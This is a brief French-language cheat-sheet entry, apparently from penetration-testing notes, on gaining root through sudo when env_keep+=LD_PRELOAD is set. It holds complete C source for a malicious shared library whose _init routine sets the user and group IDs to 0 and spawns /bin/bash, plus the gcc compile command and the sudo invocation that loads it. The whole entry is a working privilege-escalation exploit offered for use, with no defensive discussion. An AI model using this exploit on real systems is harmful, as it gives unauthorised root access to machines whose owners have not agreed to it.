# LD_PRELOAD
En effectuant un `sudo -l`, si l'information `env_keep+=LD_PRELOAD` est trouvée, il est possible d'écrire un code en C pour accéder au serveur en `root`
```C
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h>

void _init() { 
  unsetenv("LD_PRELOAD"); 
  setgid(0); 
  setuid(0); 
  system("/bin/bash"); 
} 
```

Compiler le fichier
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles 
```

Exécution
```bash
sudo LD_PRELOAD=./shell.so [bin à exécuter]
```
